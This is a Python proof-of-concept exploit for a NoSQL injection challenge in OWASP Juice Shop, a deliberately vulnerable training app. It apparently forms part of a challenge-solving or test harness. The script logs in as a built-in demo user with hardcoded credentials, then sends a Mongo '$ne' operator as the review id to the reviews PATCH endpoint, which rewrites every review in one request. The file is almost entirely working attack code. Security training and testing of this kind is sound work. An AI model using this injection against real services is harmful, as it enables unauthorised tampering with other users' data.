"""NoSQL injection in routes/updateProductReviews.ts:18 (noSqlReviewsChallenge).

The PATCH /rest/products/reviews handler uses req.body.id as the Mongo _id
selector in reviewsCollection.update({_id: req.body.id}, ..., {multi: true}).
A specific id matches at most one review; a selector object like {"$ne": "-1"}
matches every review, so one request rewrites all of them. The endpoint is
behind security.isAuthorized() (expressJwt), so a normal login token is used.

Proof: with a concrete (non-existent) id the update modifies 0 rows; with the
{$ne} selector it modifies many (the whole collection).
"""

import json
import urllib.request

USER = {"email": "jim@juice-sh.op", "password": "ncc-1701"}


def _patch(base: str, token: str, id_value) -> int:
    body = json.dumps({"id": id_value, "message": "TFM_NOSQL_PROBE"}).encode()
    req = urllib.request.Request(f"{base}/rest/products/reviews", data=body, method="PATCH",
                                 headers={"content-type": "application/json",
                                          "Authorization": f"Bearer {token}"})
    with urllib.request.urlopen(req) as res:
        return json.load(res).get("modified", 0)


def exploit(base: str) -> tuple[bool, str]:
    login = urllib.request.Request(f"{base}/rest/user/login", data=json.dumps(USER).encode(),
                                   headers={"content-type": "application/json"})
    with urllib.request.urlopen(login) as res:
        token = json.load(res)["authentication"]["token"]

    baseline = _patch(base, token, "tfm-no-such-review-id")
    injected = _patch(base, token, {"$ne": "-1"})

    ok = injected > 1 and baseline == 0
    return ok, (f"{{$ne}} selector modified {injected} reviews "
                f"(concrete-id baseline={baseline})")
